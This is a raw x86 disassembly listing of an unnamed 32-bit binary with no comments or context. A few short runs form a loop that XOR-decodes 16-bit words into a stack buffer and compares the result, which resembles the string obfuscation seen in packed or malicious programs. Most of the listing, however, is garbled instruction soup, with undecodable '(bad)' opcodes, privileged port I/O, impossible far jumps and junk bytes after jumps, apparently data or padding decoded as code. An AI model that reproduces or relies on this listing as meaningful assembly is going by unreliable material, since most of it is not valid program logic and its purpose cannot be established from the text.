  40495d:	fcmovnbe st,st(5)
  40495f:	xchg   edi,eax
  404960:	cmp    bl,dl
  404962:	stc    
  404963:	inc    ebx
  404964:	xchg   dl,ah
  404966:	jnp    0x404964
  404968:	out    0x1,eax
  40496a:	outs   dx,DWORD PTR ds:[esi]
  40496b:	adc    eax,0x67764627
  404970:	jnp    0x404923
  404972:	les    eax,FWORD PTR gs:[edi+ecx*4]
  404976:	fsubr  DWORD PTR [esi+0x41]
  404979:	cmc    
  40497a:	mov    ch,al
  40497c:	mov    esp,DWORD PTR [ebx-0x110f062e]
  404982:	mov    ds:0x9f0613bf,al
  404987:	ret    
  404988:	inc    edi
  404989:	popa   
  40498a:	dec    esi
  40498b:	jg     0x4049b3
  40498d:	cld    
  40498e:	mov    ds:0xfd8f781d,al
  404993:	xchg   esp,eax
  404994:	ficom  WORD PTR [eax+esi*4]
  404997:	cli    
  404998:	not    BYTE PTR [eax]
  40499a:	mov    esp,0xcc41bb36
  40499f:	cwde   
  4049a0:	mov    ds:0x81f819da,al
  4049a5:	test   eax,0xf6092eba
  4049aa:	pop    edi
  4049ab:	ret    0xe237
  4049ae:	and    eax,0x2ec391d6
  4049b3:	mov    ecx,0x2836bd72
  4049b8:	cmp    BYTE PTR [ecx+0x57],al
  4049bb:	and    eax,0x85d6b128
  4049c0:	retf   
  4049c1:	repnz nop DWORD PTR [ebx]
  4049c5:	adc    BYTE PTR [ebp+0x94a03db],al
  4049cb:	push   eax
  4049cc:	cmp    BYTE PTR gs:[ebx-0x54],dl
  4049d0:	ret    
  4049d1:	sti    
  4049d2:	sbb    BYTE PTR [ecx-0x2e4eb08e],ch
  4049d8:	fs fs mov ebp,0x2721c266
  4049df:	push   edi
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43371b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4336b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433653
  404a04:	sbb    DWORD PTR ds:0x4336f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433723,0x4336f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433733,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx-0x40]
  404a70:	add    BYTE PTR [edx],cl
  404a72:	icebp  
  404a73:	test   BYTE PTR ds:0x7fab7c7c,ch
  404a79:	jl     0x404af7
  404a7b:	push   ss
  404a7c:	mov    eax,0x7043d558
  404a81:	mov    DWORD PTR [edi+esi*4],ebp
  404a84:	pop    ebx
  404a85:	sub    cl,BYTE PTR [eax+0x60f92f4e]
  404a8b:	sar    BYTE PTR [edi+0x59],cl
  404a8e:	lock mov eax,ds:0xb177574f
  404a94:	push   ebp
  404a95:	jp     0x404ad0
  404a97:	xchg   edx,eax
  404a98:	in     eax,0x27
  404a9a:	sti    
  404a9b:	dec    ebp
  404a9c:	mov    ebx,0x5e2b4991
  404aa1:	loopne 0x404b00
  404aa3:	rcl    BYTE PTR [ebp+0x62],1
  404aa6:	pop    ebx
  404aa7:	xor    ebx,DWORD PTR [edi]
  404aa9:	das    
  404aaa:	xor    ebp,esi
  404aac:	cmp    BYTE PTR [edi-0x42cc694c],cl
  404ab2:	nop
  404ab3:	push   ecx
  404ab4:	adc    al,0xf1
  404ab6:	inc    ebx
  404ab7:	je     0x404b16
  404ab9:	xchg   ebx,eax
  404aba:	dec    esp
  404abb:	test   eax,edi
  404abd:	sub    DWORD PTR [edi],0xe92301e6
  404ac3:	retf   
  404ac4:	push   edx
  404ac5:	ror    BYTE PTR [esi],1
  404ac7:	mov    ebx,0xf542b2bc
  404acc:	call   FWORD PTR [ecx+0x577bcb34]
  404ad2:	xchg   BYTE PTR [edx-0x6eb9aa25],bl
  404ad8:	nop
  404ad9:	inc    esp
  404ada:	int3   
  404adb:	adc    ecx,DWORD PTR [edx+0x63]
  404ade:	mov    bl,0xa2
  404ae0:	pop    edx
  404ae1:	push   es
  404ae2:	pop    eax
  404ae3:	ds std 
  404ae5:	xor    al,0x8
  404ae7:	cli    
  404ae8:	sti    
  404ae9:	dec    esp
  404aea:	mov    ah,0xa0
  404aec:	stos   BYTE PTR es:[edi],al
  404aed:	test   al,0x64
  404aef:	push   es
  404af0:	xchg   ecx,eax
  404af1:	data16 adc BYTE PTR [eax-0x34],cl
  404af5:	into   
  404af6:	mov    ch,0x3c
  404af8:	je     0x404b0b
  404afa:	pop    ebx
  404afb:	or     DWORD PTR [ecx-0x39e8d9e5],edx
  404b01:	or     ah,dh
  404b03:	add    bh,ch
  404b05:	test   al,0xa6
  404b07:	pop    edi
  404b08:	clc    
  404b09:	cdq    
  404b0a:	cmc    
  404b0b:	xchg   DWORD PTR [edi],edi
  404b0d:	outs   dx,DWORD PTR ds:[esi]
  404b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b0f:	jo     0x404b54
  404b11:	paddsb mm1,QWORD PTR [ecx]
  404b14:	sub    BYTE PTR [eax+0x43],0x46
  404b18:	dec    edi
  404b19:	enter  0x1b5a,0xf3
  404b1d:	mov    dh,0x71
  404b1f:	xor    eax,0x2931f72d
  404b24:	pusha  
  404b25:	mov    BYTE PTR [ecx],ch
  404b27:	jo     0x404b08
  404b29:	or     al,0x81
  404b2b:	and    cl,bl
  404b2d:	in     eax,dx
  404b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b2f:	cmp    bl,dh
  404b31:	cmp    eax,0x5fce3e9c
  404b36:	sub    DWORD PTR [edi+0x73],esi
  404b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3a:	add    DWORD PTR [ebx],ebx
  404b3c:	dec    ecx
  404b3d:	iret   
  404b3e:	or     ebx,ebx
  404b40:	pop    ecx
  404b41:	and    BYTE PTR [ebx+0x66cd7891],ch
  404b47:	icebp  
  404b48:	push   ebx
  404b49:	les    esi,FWORD PTR [edx-0x6e]
  404b4c:	xchg   esp,eax
  404b4d:	adc    DWORD PTR [ecx],0xffffffdb
  404b50:	push   esp
  404b51:	and    BYTE PTR [ebx],0x2d
  404b54:	pop    eax
  404b55:	xor    dh,cl
  404b57:	dec    eax
  404b58:	jae    0x404b0a
  404b5a:	mov    al,ds:0xd61e055b
  404b5f:	jns    0x404b43
  404b61:	adc    ecx,ecx
  404b63:	mov    ds:0x59e2eb6a,al
  404b68:	cmp    DWORD PTR [ecx],ebp
  404b6a:	pop    eax
  404b6b:	pusha  
  404b6c:	add    ch,bl
  404b6e:	fstp   DWORD PTR [ebx]
  404b70:	and    bl,BYTE PTR [eax-0x60]
  404b73:	cmp    cl,bl
  404b75:	sbb    BYTE PTR [esi+edx*4-0x521bcc64],dl
  404b7c:	sbb    DWORD PTR [esi-0x6a],edx
  404b7f:	lods   eax,DWORD PTR ds:[esi]
  404b80:	and    BYTE PTR [edx],bl
  404b82:	mov    ch,0xca
  404b84:	sub    BYTE PTR [edi+0x4f],al
  404b87:	repnz mov esi,0x426ccb27
  404b8d:	inc    edx
  404b8e:	stos   BYTE PTR es:[edi],al
  404b8f:	xrelease mov BYTE PTR [edx*1+0x3de7b64d],ah
  404b97:	imul   ecx,DWORD PTR [ebx+0x25],0x57
  404b9b:	call   FWORD PTR [edi+0x15]
  404b9e:	pushw  ss
  404ba0:	push   es
  404ba1:	jbe    0x404c04
  404ba3:	and    BYTE PTR [edi],0x12
  404ba6:	dec    esi
  404ba7:	aas    
  404ba8:	add    bl,BYTE PTR [edx-0x38]
  404bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bac:	out    dx,eax
  404bad:	xor    ecx,DWORD PTR [ecx-0x23a6159a]
  404bb3:	mov    WORD PTR ds:0xd705cb9,fs
  404bb9:	pop    es
  404bba:	sub    eax,0x3db584d1
  404bbf:	push   ss
  404bc0:	addr16 pop ebx
  404bc2:	lods   eax,DWORD PTR ds:[esi]
  404bc3:	pushf  
  404bc4:	out    dx,eax
  404bc5:	cwde   
  404bc6:	push   es
  404bc7:	pop    edi
  404bc8:	ss loop 0x404be4
  404bcb:	jp     0x404c44
  404bcd:	adc    bh,BYTE PTR [ebx-0x5eee615e]
  404bd3:	xchg   ebp,eax
  404bd4:	and    DWORD PTR [edi-0x17844d46],esp
  404bda:	adc    esi,eax
  404bdc:	jnp    0x404b69
  404bde:	xor    eax,0x74c2e348
  404be3:	out    dx,al
  404be4:	mov    al,ds:0xa17ed705
  404be9:	inc    esi
  404bea:	inc    edi
  404beb:	dec    BYTE PTR es:[esi+0x2a]
  404bef:	xchg   ebp,eax
  404bf0:	mov    cl,0xab
  404bf2:	fild   DWORD PTR [esi]
  404bf4:	add    DWORD PTR [ecx-0x70],esi
  404bf7:	xchg   esp,eax
  404bf8:	and    ah,bh
  404bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bfb:	inc    eax
  404bfc:	jbe    0x404bfa
  404bfe:	les    ecx,FWORD PTR [ecx+0x3a]
  404c01:	sub    eax,0xce516bd3
  404c06:	xor    edi,edx
  404c08:	sbb    esi,edi
  404c0a:	pop    es
  404c0b:	loop   0x404c04
  404c0d:	imul   ebx,DWORD PTR [ecx],0x20a26611
  404c13:	inc    eax
  404c14:	bound  ebp,QWORD PTR [ebx+eax*4+0x6f]
  404c18:	fucomp st(4)
  404c1a:	aad    0x62
  404c1c:	ret    0xa6c2
  404c1f:	sbb    BYTE PTR [eax-0x1e],0x56
  404c23:	push   eax
  404c24:	mov    esi,0x2534894e
  404c29:	test   al,cl
  404c2b:	sub    DWORD PTR ds:0x3393ef73,ecx
  404c31:	rol    DWORD PTR [ebx],0xc6
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	ins    DWORD PTR es:[edi],dx
  404c5e:	lock das 
  404c60:	push   ds
  404c61:	xor    ebp,DWORD PTR [edi]
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c11
  404c6a:	jns    0x404c90
  404c6c:	pusha  
  404c6d:	in     eax,dx
  404c6e:	out    0xf6,al
  404c70:	scas   al,BYTE PTR es:[edi]
  404c71:	mov    ds:0x248cce16,eax
  404c76:	xchg   esi,eax
  404c77:	aaa    
  404c78:	xchg   esi,eax
  404c79:	sub    edi,DWORD PTR [edx-0x2291e151]
  404c7f:	in     al,0x78
  404c81:	ins    DWORD PTR es:[edi],dx
  404c82:	mov    al,ds:0x719a63b3
  404c87:	xchg   ebp,eax
  404c89:	or     BYTE PTR ds:0x355120c7,0x47
  404c90:	mov    ah,0xe
  404c92:	or     DWORD PTR [esi+0x3e],eax
  404c95:	add    BYTE PTR [eax-0x518b67f1],dh
  404c9b:	xchg   edx,eax
  404c9c:	xchg   esi,eax
  404c9d:	retf   0x73f
  404ca0:	je     0x404c6d
  404ca2:	mov    ecx,0xde858bd2
  404ca7:	repnz cs cmp al,0x9b
  404cab:	jl     0x404cd3
  404cad:	fsub   st,st(4)
  404caf:	aad    0x65
  404cb1:	iret   
  404cb2:	int3   
  404cb3:	test   ax,0xe51c
  404cb7:	hlt    
  404cb8:	pop    ds
  404cb9:	inc    eax
  404cba:	jg     0x404d14
  404cbc:	ret    0x7452
  404cbf:	mov    edx,edx
  404cc1:	call   FWORD PTR [ecx-0x5467ab73]
  404cc7:	in     eax,dx
  404cc8:	fnstsw WORD PTR [ecx+ebx*8-0x68]
  404ccc:	lods   eax,DWORD PTR ds:[esi]
  404ccd:	loopne 0x404d4d
  404ccf:	dec    ebx
  404cd0:	fild   QWORD PTR [ebp+0x52]
  404cd3:	(bad)  
  404cd5:	icebp  
  404cd6:	adc    DWORD PTR [ecx+0x3abbe02],ecx
  404cdc:	loope  0x404cdc
  404cde:	paddsw mm4,QWORD PTR ds:0x44d621ae
  404ce5:	and    dh,BYTE PTR [ecx-0x70]
  404ce8:	out    0xd8,eax
  404cea:	ss jb  0x404d1a
  404ced:	(bad)
  404cf1:	xlat   BYTE PTR ds:[ebx]
  404cf2:	push   ebx
  404cf3:	mov    dl,0x9e
  404cf5:	pusha  
  404cf6:	ret    0x7280
  404cf9:	lahf   
  404cfa:	mov    edi,0x6eb6043e
  404cff:	jbe    0x404d78
  404d01:	dec    ebp
  404d02:	jp     0x404d2e
  404d04:	push   es
  404d05:	push   ss
  404d06:	add    al,0x23
  404d08:	fdivr  QWORD PTR [eax]
  404d0a:	pop    ecx
  404d0b:	adc    cl,dh
  404d0d:	mov    edx,0x375efb1e
  404d12:	into   
  404d13:	xor    esp,esp
  404d15:	inc    esp
  404d16:	mov    ah,BYTE PTR [edx+ecx*2+0x4286ea61]
  404d1d:	push   ds
  404d1e:	mov    ch,0x7d
  404d20:	test   al,0xdb
  404d22:	or     dh,BYTE PTR [edi]
  404d24:	mov    eax,ds:0xd33e1c6e
  404d29:	adc    BYTE PTR [ebp+0x16778c6e],dh
  404d2f:	into   
  404d30:	jp     0x404cdf
  404d32:	out    dx,al
  404d33:	mov    dl,0x4a
  404d35:	out    0xed,al
  404d37:	daa    
  404d38:	int    0xf0
  404d3a:	push   ebx
  404d3b:	iret   
  404d3c:	imul   eax,DWORD PTR [ecx],0xfffffffb
  404d3f:	push   ebp
  404d40:	fwait
  404d41:	mov    bh,0xb9
  404d43:	mov    esp,0xe9bb2026
  404d48:	sahf   
  404d49:	cmp    edi,DWORD PTR [ecx]
  404d4b:	push   esp
  404d4c:	cmp    al,bh
  404d4e:	je     0x404dcb
  404d50:	(bad)  
  404d51:	jns    0x404d5b
  404d53:	outs   dx,DWORD PTR ds:[esi]
  404d54:	inc    ebp
  404d55:	mov    DWORD PTR [eax+0x19],ebx
  404d58:	or     al,0xf5
  404d5a:	dec    esi
  404d5b:	fwait
  404d5c:	adc    ebx,ebp
  404d5e:	add    DWORD PTR [ebp+ecx*4+0x49],eax
  404d62:	ror    bh,1
  404d64:	pusha  
  404d65:	push   esi
  404d66:	sub    al,0x76
  404d68:	jl     0x404da2
  404d6a:	mov    WORD PTR [esi+ecx*4-0x6fc7cffe],fs
  404d71:	out    0xe4,eax
  404d73:	sbb    BYTE PTR [ebx],0x4
  404d76:	pop    ebp
  404d77:	pop    es
  404d78:	add    dl,BYTE PTR [ecx+eiz*4-0x29]
  404d7c:	add    al,0x93
  404d7e:	jg     0x404d40
  404d80:	jge    0x404d02
  404d82:	sub    ch,BYTE PTR [edi]
  404d84:	imul   DWORD PTR fs:0xa2ca0176
  404d8b:	xchg   edx,eax
  404d8c:	adc    ebx,eax
  404d8e:	iret   
  404d8f:	data16 adc BYTE PTR [edx],bl
  404d92:	adc    al,0x52
  404d94:	jmp    0xd8f8:0x3f4b9ace
  404d9b:	sub    DWORD PTR [ebp+0x3a],ebx
  404d9e:	std    
  404d9f:	xor    ah,BYTE PTR [esi+0x8295afc]
  404da5:	adc    eax,0x79443525
  404daa:	fld    TBYTE PTR [edi+0x502c817b]
  404db0:	mov    edi,0xfaebf681
  404db5:	scas   eax,DWORD PTR es:[edi]
  404db6:	cli    
  404db7:	sub    al,0xf5
  404db9:	sub    BYTE PTR [ebp-0x7d],bl
  404dbc:	out    0xd4,eax
  404dbe:	mov    bh,0x59
  404dc0:	lahf   
  404dc1:	ret    
  404dc2:	inc    ebx
  404dc3:	data16 adc al,0x9d
  404dc6:	push   edx
  404dc7:	mov    ebx,0x6eff8bae
  404dcc:	jmp    0xbd09a1f1
  404dd1:	xchg   edi,eax
  404dd2:	xor    DWORD PTR [ebp+0x13],edx
  404dd5:	ins    BYTE PTR es:[edi],dx
  404dd6:	push   0xc973d5c9
  404ddb:	retf   
  404ddc:	les    ecx,FWORD PTR gs:[edi+0x4b]
  404de0:	mov    dl,BYTE PTR [eax]
  404de2:	pop    esi
  404de3:	in     eax,dx
  404de4:	aas    
  404de5:	outs   dx,BYTE PTR ds:[esi]
  404de6:	fcmovnbe st,st(5)
  404de8:	std    
  404de9:	adc    esi,DWORD PTR [ebp+0x25]
  404dec:	fcomp  DWORD PTR [edx+ebp*8-0x4c]
  404df0:	jb     0x404e24
  404df2:	ret    
  404df3:	mov    al,0xfe
  404df5:	mov    WORD PTR [edx],gs
  404df7:	push   edx
  404df8:	ins    BYTE PTR es:[edi],dx
  404df9:	out    dx,eax
  404dfa:	sti    
  404dfb:	iret   
  404dfc:	hlt    
  404dfd:	sbb    DWORD PTR [ebx-0x54],edi
  404e00:	fsubr  QWORD PTR ds:[eax-0x2]
  404e04:	popf   
  404e05:	mov    ch,0x2c
  404e07:	mov    dl,0xc7
  404e09:	push   eax
  404e0a:	jmp    0x33b8:0x1f9dee8
  404e11:	gs (bad) 
  404e13:	push   esp
  404e14:	or     ch,BYTE PTR [ecx+0x69]
  404e17:	pop    esp
  404e18:	enter  0x2f58,0xb7
  404e1c:	cmp    ebx,DWORD PTR [edx-0x76]
  404e1f:	inc    esp
  404e20:	add    eax,0xc558ba8
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0x84e7304
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e86
  404e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e57:	nop
  404e58:	iret   
  404e59:	push   eax
  404e5a:	outs   dx,DWORD PTR ds:[esi]
  404e5b:	sbb    BYTE PTR [edi],cl
  404e5d:	pop    ebx
  404e5e:	pop    es
  404e5f:	(bad)  
  404e60:	lock mov ds:0x8c06b9f4,al
  404e66:	lds    edx,FWORD PTR [ecx+eiz*2-0x7a]
  404e6a:	add    eax,0xd8ee519
  404e6f:	out    0x44,al
  404e71:	push   ebp
  404e72:	ja     0x404eba
  404e74:	ret    0xa5c4
  404e77:	mov    ecx,0x80c4ac6
  404e7c:	dec    esi
  404e7d:	pop    ss
  404e7e:	fistp  WORD PTR [ebx+eiz*1]
  404e81:	bndldx (bad),[edx]
  404e84:	imul   esi,DWORD PTR [esi-0x3f],0x51
  404e88:	push   esi
  404e89:	scas   eax,DWORD PTR es:[edi]
  404e8a:	pop    eax
  404e8b:	out    0x6b,eax
  404e8d:	and    BYTE PTR ds:0xfe858734,dl
  404e93:	sbb    ah,BYTE PTR [eax+eax*4]
  404e96:	cmp    edi,DWORD PTR [edx+0x235683fb]
  404e9c:	in     eax,0xdd
  404e9e:	xchg   esi,eax
  404e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ea0:	(bad)  
  404ea1:	(bad)  
  404ea2:	scas   al,BYTE PTR es:[edi]
  404ea3:	or     edi,esi
  404ea5:	sbb    DWORD PTR [ecx],0xe4361cfe
  404eab:	out    dx,eax
  404eac:	dec    edi
  404ead:	push   ebx
  404eae:	xchg   edx,eax
  404eaf:	inc    ebp
  404eb0:	xchg   esi,eax
  404eb1:	rol    DWORD PTR [ebp+0x512841f3],0x95
  404eb8:	mov    edi,0xf18479d9
  404ebd:	mov    ebx,0xc8f91d94
  404ec2:	cmp    BYTE PTR [ebx],al
  404ec4:	pop    ebp
  404ec5:	arpl   sp,si
  404ec7:	jg     0x404e4e
  404ec9:	pop    eax
  404eca:	jp     0x404f25
  404ecc:	inc    ecx
  404ecd:	xor    ebx,DWORD PTR [ecx]
  404ecf:	xor    ebx,ebp
  404ed1:	and    edx,ebp
  404ed3:	dec    edx
  404ed4:	inc    ebp
  404ed5:	call   0xd170:0x31fd1de8
  404edc:	int    0x62
  404ede:	mov    ebx,0x567b95c5
  404ee3:	mov    ah,0x8f
  404ee5:	jbe    0x404f28
  404ee7:	xor    esp,DWORD PTR [edi-0x228bb479]
  404eed:	fsubr  st(4),st
  404eef:	les    edi,FWORD PTR [esi+ebp*8-0x48d3ba08]
  404ef6:	mov    edx,0x5b706e65
  404efb:	xchg   ebx,eax
  404efc:	jecxz  0x404ec0
  404efe:	xlat   BYTE PTR ds:[ebx]
  404eff:	leave  
  404f00:	and    BYTE PTR [edi],dh
  404f02:	pop    ecx
  404f03:	sbb    eax,0xc817b549
  404f08:	mov    eax,ds:0xf57f6d75
  404f0d:	pop    edi
  404f0e:	mov    BYTE PTR [ecx+0x23ce1193],ah
  404f14:	and    ch,cl
  404f16:	ror    esi,0xb
  404f19:	call   0xc0ab:0xdcb663f5
  404f20:	pop    ds
  404f21:	outs   dx,DWORD PTR ds:[esi]
  404f22:	sub    al,0x3e
  404f24:	call   0x32f59e56
  404f29:	xchg   edi,eax
  404f2a:	or     ebp,DWORD PTR [ebx]
  404f2c:	add    DWORD PTR [edx+0xe78c9b8],ebx
  404f32:	aam    0xbe
  404f34:	add    BYTE PTR [ebx-0x26],bl
  404f37:	dec    eax
  404f38:	mov    dh,0x89
  404f3a:	gs pushf 
  404f3c:	test   al,0xa8
  404f3e:	xchg   edi,eax
  404f3f:	int    0xca
  404f41:	add    DWORD PTR [ebx+eax*1-0x80],esp
  404f45:	into   
  404f46:	das    
  404f47:	daa    
  404f48:	cli    
  404f49:	xor    DWORD PTR [ecx-0x35a02149],eax
  404f4f:	ins    DWORD PTR es:[edi],dx
  404f50:	xor    BYTE PTR [edi+eax*4-0x3baa5982],cl
  404f57:	hlt    
  404f58:	test   al,0x17
  404f5a:	push   ebp
  404f5b:	jge    0x404ef9
  404f5d:	push   ebp
  404f5e:	cld    
  404f5f:	xor    bh,ch
  404f61:	pop    edx
  404f62:	cli    
  404f63:	xchg   DWORD PTR [ecx],edx
  404f65:	pop    ebx
  404f66:	xor    DWORD PTR [eax-0x4],edx
  404f69:	out    dx,al
  404f6a:	add    DWORD PTR [ebp-0x7d],esp
  404f6d:	sub    eax,0xe3dd8e
  404f72:	rcl    ecx,cl
  404f74:	fstp   QWORD PTR [ebp-0x6e]
  404f77:	cmp    DWORD PTR [ebx+0x1d],ecx
  404f7a:	xchg   edi,eax
  404f7b:	mov    eax,DWORD PTR [ebx-0x3c7bec28]
  404f81:	ds in  eax,0xd8
  404f84:	ret    
  404f85:	stos   BYTE PTR es:[edi],al
  404f86:	in     al,dx
  404f87:	aam    0x78
  404f89:	cmp    esi,ebp
  404f8b:	jbe    0x404f50
  404f8d:	lods   eax,DWORD PTR ds:[esi]
  404f8e:	and    DWORD PTR [ecx],esi
  404f90:	pusha  
  404f91:	sub    al,0x86
  404f93:	ins    BYTE PTR es:[edi],dx
  404f94:	sbb    ebp,DWORD PTR gs:[edi-0x6028134f]
  404f9b:	fstp   QWORD PTR [edi+0x76e0dedf]
  404fa1:	arpl   WORD PTR [eax-0x4dec105f],bx
  404fa7:	mov    ebp,0x7897999e
  404fac:	or     BYTE PTR [edx],bh
  404fae:	or     al,0xa1
  404fb0:	repz jmp FWORD PTR [edx-0x7c56ff90]
  404fb7:	mov    cl,0x8e
  404fb9:	lods   eax,DWORD PTR ds:[esi]
  404fba:	fistp  QWORD PTR [esi+0x1b3ce794]
  404fc0:	xchg   esp,eax
  404fc1:	inc    ebp
  404fc2:	out    dx,eax
  404fc3:	lds    edi,FWORD PTR [eax+0x28]
  404fc6:	push   ecx
  404fc7:	xor    al,0x6d
  404fc9:	jp     0x404f5b
  404fcb:	adc    BYTE PTR [ebx],bl
  404fcd:	call   0xe85:0x1197bc3d
  404fd4:	jle    0x404faf
  404fd6:	cmp    edx,edx
  404fd8:	fnsave [eax-0x41]
  404fdb:	mov    BYTE PTR [edi],dl
  404fdd:	cmc    
  404fde:	and    dl,BYTE PTR [esp+edx*4-0x20]
  404fe2:	aas    
  404fe3:	xchg   esp,eax
  404fe4:	das    
  404fe5:	sbb    BYTE PTR [esi+ebx*8+0x3aceb533],bl
  404fec:	lds    eax,FWORD PTR [ecx]
  404fee:	mov    dh,0x48
  404ff0:	repnz lock mov bh,0x72
  404ff4:	push   esp
  404ff5:	push   ds
  404ff6:	xchg   ebp,eax
  404ff7:	ss sub DWORD PTR es:[edi],0x6ee38216
  404fff:	jg     0x404f8e
  405001:	neg    BYTE PTR [ecx+0x23]
  405004:	push   cs
  405005:	adc    eax,0x93f11cb3
  40500a:	add    eax,esi
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	lods   al,BYTE PTR ds:[esi]
  405044:	inc    ecx
  405045:	jae    0x40507d
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x4050b3
  405050:	push   0xd1b4e25a
  405055:	pop    esp
  405056:	jge    0x404fed
  405058:	call   0x64f02169
  40505d:	xchg   ebp,eax
  40505e:	clc    
  40505f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405060:	lds    edx,FWORD PTR [eax+esi*4]
  405063:	aam    0xe0
  405065:	mov    eax,DWORD PTR [edi]
  405067:	push   0xffffffe6
  405069:	mov    esi,0x7ac2ab3f
  40506e:	int3   
  40506f:	inc    ebx
  405070:	sti    
  405071:	out    dx,al
  405072:	popa   
  405073:	mov    ds:0x10792643,eax
  405078:	call   0x256c11c2
  40507d:	pop    edx
  40507e:	ror    BYTE PTR [edx-0x6f],cl
  405081:	mov    bl,0xd3
  405083:	(bad)  
  405084:	jns    0x4050c1
  405086:	pop    eax
  405087:	inc    ecx
  405088:	adc    ch,0xed
  40508b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40508c:	shl    DWORD PTR [ebp+ebp*2+0x2c],cl
  405090:	outs   dx,DWORD PTR ds:[esi]
  405091:	std    
  405092:	shl    DWORD PTR [edx+0x7146ff62],0x98
  405099:	jmp    0x405039
  40509b:	stos   DWORD PTR es:[edi],eax
  40509c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40509d:	mov    dl,0x13
  40509f:	mov    eax,0x90651320
  4050a4:	in     al,0x4d
  4050a6:	mov    bh,0x9e
  4050a8:	mov    bl,0x59
  4050aa:	and    ch,BYTE PTR [edx-0x3e]
  4050ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050ae:	dec    ecx
  4050af:	inc    edi
  4050b0:	je     0x40505f
  4050b2:	or     BYTE PTR [ebp+0x3fcaf9e5],dh
  4050b8:	(bad)  
  4050b9:	lods   al,BYTE PTR ds:[esi]
  4050ba:	cmp    eax,0x226e92e7
  4050bf:	cmc    
  4050c0:	jns    0x40513b
  4050c2:	aas    
  4050c3:	sub    DWORD PTR [ebp+0x5],ecx
  4050c6:	imul   edi,esi,0x216cd3b9
  4050cc:	cs jo  0x405148
  4050cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d0:	and    ecx,esp
  4050d2:	imul   ecx,DWORD PTR [eax+ebx*2-0x17],0x40b30546
  4050da:	add    ah,BYTE PTR [ecx]
  4050dc:	push   es
  4050dd:	mov    esp,0x97a1ef82
  4050e2:	in     eax,0x49
  4050e4:	call   0x283:0xb69db0a4
  4050eb:	in     al,dx
  4050ec:	in     al,0xd2
  4050ee:	aad    0xbb
  4050f0:	scas   eax,DWORD PTR es:[edi]
  4050f1:	dec    edx
